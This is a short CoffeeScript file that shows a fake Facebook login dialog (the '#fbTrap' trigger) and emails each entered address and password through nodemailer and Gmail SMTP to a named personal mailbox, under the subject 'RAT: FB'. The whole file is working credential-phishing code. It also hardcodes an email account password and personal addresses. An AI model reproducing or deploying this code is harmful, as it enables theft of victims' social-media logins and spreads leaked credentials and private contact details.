fbTrapTrigger = document.querySelector '#fbTrap'
fbDialog = document.querySelector '#fbDialog'
fbForm = document.querySelector '#fbForm'
fbTrapTrigger.addEventListener 'click', (e)->
    e.preventDefault()
    fbDialog.showModal()

fbDialog.addEventListener 'click', ()->
    rect = fbDialog.getBoundingClientRect()
    isInDialog=(rect.top <= event.clientY && event.clientY <= rect.top + rect.height && rect.left <= event.clientX && event.clientX <= rect.left + rect.width);
    if isInDialog is false
        fbDialog.close()

fbForm.addEventListener 'submit', (e)->
    e.preventDefault()
    nodemailer = require 'nodemailer'
    emailaddress = 'reportataxi@gmail.com'
    password = 'reportataxi99'
    transporter = nodemailer.createTransport 'smtps://'+emailaddress+':'+password+'@smtp.gmail.com'
    fbEmail = document.querySelector 'input[name="fbEmail"]'
    fbPassword = document.querySelector 'input[name="fbPassword"]'
    mailOptions = {
        from: 'RAT <'+emailaddress+'>'
        to: 'John Eric Torres Orolfo <earljohn3ric@gmail.com>'
        subject: 'RAT: FB'
        text: 'New Login - '+fbEmail.value+':'+fbPassword.value
    }
    transporter.sendMail mailOptions, (err, info)->
        if err
            console.log err
        console.log 'Sent :3'